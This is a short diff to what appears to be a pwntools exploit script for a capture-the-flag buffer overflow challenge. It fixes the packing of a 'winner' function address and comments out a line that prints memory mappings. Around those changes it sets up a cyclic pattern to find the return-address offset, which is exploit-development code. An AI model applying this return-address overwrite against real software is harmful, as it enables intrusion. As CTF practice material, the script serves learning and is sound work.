@@ -6,7 +6,7 @@ context(os='linux', arch='amd64')
 
 padding_length = 56
 #ret_offset = -96
-winner_address = u64(0x401206, endian='big')
+winner_address = p64(0x401206, endian='big')
 
 log.info('Create IO')
 #io = remote('', )
@@ -33,7 +33,7 @@ info("cyclic pattern = %s", pattern.decode())
 rip_offset = cyclic_find(pattern)
 info("rip offset is = %d", rip_offset)
 
-info("mappings are = %s", core.mappings)
+#info("mappings are = %s", core.mappings)
 
 io.interactive()
 
